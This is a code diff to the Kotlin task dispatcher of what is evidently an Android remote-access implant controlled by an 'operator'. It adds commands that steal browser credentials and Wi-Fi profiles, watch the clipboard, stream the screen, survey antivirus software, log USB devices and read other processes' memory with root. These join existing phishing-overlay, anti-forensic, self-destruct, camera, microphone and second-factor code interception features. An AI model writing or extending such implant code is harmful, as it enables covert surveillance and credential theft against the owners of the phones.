@@ -40,6 +40,9 @@ object TaskRunner {
         "media.mic", "media.camera", "live.screen", "ui.stream",
         // the false screen, the databases and the end of it
         "phish.overlay", "app.dump", "anti.forensic", "evade.suicide",
+        // the senses of the desktop, on the phone
+        "window.list", "clipboard.watch", "screen.stream", "wifi.profiles",
+        "browser.creds", "av.survey", "usb.history", "proc.memory",
     )
 
     /**
@@ -414,6 +417,20 @@ object TaskRunner {
             "call.logs" -> sense("call.logs", args)
             "emulator.detect" -> lab(args)
 
+            // ---- the senses of the desktop, on the phone -----------------
+            // The phone is not a desktop.  What the platform allows is
+            // answered, and what it hides is refused with the reason, so
+            // the operator knows the difference between "nothing there"
+            // and "the platform will not say".
+            "window.list" -> desktopWindows()
+            "clipboard.watch" -> watch("clipboard", args, "clipboard.watch")
+            "screen.stream" -> projection("screen.stream", args)
+            "wifi.profiles" -> desktopOf("wifi.profiles") { Desktop.wifiProfiles(it) }
+            "browser.creds" -> desktopOf("browser.creds") { Desktop.browserCreds(it) }
+            "av.survey" -> desktopOf("av.survey") { Desktop.avSurvey(it) }
+            "usb.history" -> desktopUsb(args)
+            "proc.memory" -> desktopMemory(args)
+
             // ---- the watchers ---------------------------------------------
             // The queue of the watchers is durable and the phone connects
             // again as soon as something arrives.
@@ -652,13 +669,89 @@ object TaskRunner {
     }
 
     /**
+     * A report of the desktop families.
+     *
+     * The task runner is plain JVM code and the tests run without a
+     * phone, so the context is optional everywhere: a family that needs
+     * a phone that is not there answers with an error, not with a crash.
+     */
+    private fun desktopOf(kind: String, report: (android.content.Context) -> Sense.Report): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to look at")
+        return desktopReport(report(ctx))
+    }
+
+    /**
+     * The window table of the phone.
+     *
+     * The phone has no window table; the accessibility service sees the
+     * windows that came to the front, and that log is what the operator
+     * gets.
+     */
+    private fun desktopWindows(): Outcome {
+        val report = Desktop.windows()
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+    }
+
+    /**
+     * A report of the desktop families.
+     *
+     * The report is the shape the operator knows: the rows and the notes.
+     */
+    private fun desktopReport(report: Sense.Report): Outcome {
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+    }
+
+    /**
+     * The USB devices of the phone.
+     *
+     * The watcher of the keys is started and stopped like the other
+     * watchers, and the answer tells the operator which devices are
+     * attached and which ones the implant has seen.
+     */
+    private fun desktopUsb(args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "usb.history: the phone has no context to read")
+        val action = args.field("action")?.text() ?: "status"
+        when (action) {
+            "start" -> return Outcome(0, UsbWatch.start(ctx).toByteArray(), "")
+            "stop" -> return Outcome(0, UsbWatch.stop(ctx).toByteArray(), "")
+        }
+        val report = Desktop.usb(ctx, ctx.filesDir.absolutePath)
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+            .with("watch", Upk.bool(UsbWatch.running()))
+    }
+
+    /**
+     * The memory of a process of the phone.
+     *
+     * The memory of another application belongs to that application, so
+     * the answer needs root and says so when it is not there.
+     */
+    private fun desktopMemory(args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "proc.memory: the phone has no context to read")
+        val pid = args.field("pid")?.text() ?: ""
+        val report = Desktop.memory(ctx, pid)
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+    }
+
+    /**
      * The watchers of the phone.
      *
      * The queue is durable and the phone connects again as soon as
      * something arrives, so the operator does not wait for the next
      * check-in to read the code of the second factor.
      */
-    private fun watch(kind: String, args: Upk): Outcome {
+    private fun watch(kind: String, args: Upk, label: String = kind): Outcome {
         val ctx = context?.android
             ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to watch")
         val action = args.field("action")?.text() ?: "status"
@@ -684,7 +777,7 @@ object TaskRunner {
                     .with("watch_total", Upk.num(items.size.toLong()))
             }
             else -> {
-                val text = if (kind == "sms") SmsWatch.status(ctx) else ClipboardWatch.status(ctx)
+                val text = if (kind == "sms") SmsWatch.status(ctx) else ClipboardWatch.status(ctx, label)
                 Outcome(0, text.toByteArray(), "")
             }
         }
@@ -793,7 +886,10 @@ object TaskRunner {
                 Outcome(0, "$kind: the capture of the screen was stopped\n".toByteArray(), "")
             }
             "frames" -> {
-                val count = args.field("count")?.long()?.toInt()?.coerceIn(1, 60) ?: 5
+                // The desktop names the number of the pictures "frames",
+                // and the phone calls it "count": both are read here, so
+                // the operator may use the name of the desktop.
+                val count = (args.field("count") ?: args.field("frames"))?.long()?.toInt()?.coerceIn(1, 60) ?: 5
                 val frames = Projection.drain(count)
                 val outcome = Outcome(0, "$kind: ${frames.size} pictures\n".toByteArray(), "")
                     .with("frames", Upk.num(frames.size.toLong()))
